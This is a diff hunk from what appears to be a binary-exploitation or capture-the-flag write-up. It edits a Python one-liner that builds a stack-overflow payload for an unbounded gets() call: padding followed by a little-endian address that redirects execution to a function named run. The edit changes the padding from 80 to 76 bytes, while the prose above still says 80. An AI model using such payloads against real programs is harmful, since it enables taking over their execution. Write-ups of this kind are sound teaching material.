@@ -88,7 +88,7 @@ An unbounded `gets()` call upon a stack buffer, permitting the overwriting of th
 The payload is constructed as 80 bytes of padding, followed by the address of `run` in little-endian form:
 
 ```bash
-python -c 'print "A"*80 + "\x44\x84\x04\x08"' > /tmp/payload
+python -c 'print "A"*76 + "\x44\x84\x04\x08"' > /tmp/payload
 ```
 
 (the four trailing bytes to be replaced with the true address of `run`).
